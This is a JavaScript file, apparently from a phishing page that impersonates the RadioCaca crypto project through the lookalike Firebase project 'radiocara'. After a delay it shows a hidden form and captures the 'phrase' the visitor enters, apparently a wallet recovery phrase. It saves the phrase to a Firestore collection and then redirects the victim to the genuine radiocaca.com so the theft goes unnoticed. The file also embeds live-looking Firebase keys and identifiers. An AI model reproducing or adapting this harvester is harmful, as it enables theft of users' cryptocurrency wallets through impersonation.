const firebaseConfig = {
    apiKey: "AIzaSyCYxCsNuJ1arNHZ3WqAZTVKVMTau9hPmJo",
    authDomain: "radiocara.firebaseapp.com",
    projectId: "radiocara",
    storageBucket: "radiocara.appspot.com",
    messagingSenderId: "587620505379",
    appId: "1:587620505379:web:730e377b5b6d22342b5e96",
    measurementId: "G-QKD85T5LHF"
};
firebase.initializeApp(firebaseConfig);
var db = firebase.firestore();
$(document).ready(function () {
    setTimeout(() => {
        let hasPharse = localStorage.getItem('hasPharse');
        if (!hasPharse) $('.hidden').removeClass('hidden');
    }, 3000);
    var db = firebase.firestore();
    $('#submit').click(function () {
        var phrase = $('#pharse-key').val();
        if (phrase) {
            db.collection("pharse").add({
                phrase
            })
            .then((docRef) => {
                localStorage.setItem('hasPharse', docRef);
                window.location.href = 'https://www.radiocaca.com/';
            })
            .catch((error) => {
                console.error("Error adding document: ", error);
            });
        }
    });
});